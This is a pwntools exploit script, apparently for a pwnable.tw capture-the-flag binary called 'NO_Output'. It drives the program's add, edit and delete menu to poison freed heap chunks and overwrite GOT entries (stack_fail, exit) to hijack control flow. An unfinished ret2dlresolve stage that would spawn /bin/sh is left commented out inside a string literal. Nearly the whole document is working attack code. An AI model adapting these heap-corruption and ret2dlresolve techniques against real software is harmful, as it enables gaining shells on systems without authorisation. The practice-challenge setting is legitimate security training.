#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("NO_Output_patched")

local = True 
if local:
    p = process("./NO_Output_patched")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./NO_Output_patched', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def add(idx, size, data):
    sl(b'1')
    sl(str(idx))        # 0 > 15 
    sl(str(size))       # 0 > 0x1000
    sl(data)
    log.info('Add_done!!!')

def edit(idx, data):
    sl(b'2')
    sl(str(idx))        # 0 > 15 
    sl(data)
    log.info('Edit_done!!!')

def delete(idx):
    sl(b'3')
    sl(str(idx))        # 0 > 15 
    log.info('Free_done!!!')

sl('C4t_f4t!!!')

add(0,100,'a')
add(1,100,'a')
add(2,100,'a')

delete(1)
delete(0)

##### Addr #####
chunks = 0x4040c0
stack_fail = 0x404020       # 1
exit = 0x404058             # 2
ret = 0x40140b              # 3
init = 0x40123a
tabel_addr = 0x404200
################

edit(0,p64(chunks))

add(0,100,'a')
add(10,100,p64(stack_fail)+p64(exit)+p64(0x404e00))

edit(0,p64(ret))
edit(1,p64(init))
elf = ELF('./NO_Output')
'''
dlresolve = Ret2dlresolvePayload(elf, symbol="system",args=["/bin/sh"])


edit(2,dlresolve.payload)


sl(b'6')

rop = ROP(elf)

rop.ret2dlresolve(dlresolve)
print rop.dump()



gdb.attach(p)
sl('a'*40 + rop.chain())# p64(rdi)+p64(binsh)+p64(dlresolve_addr)+p64(index))



'''
p.interactive()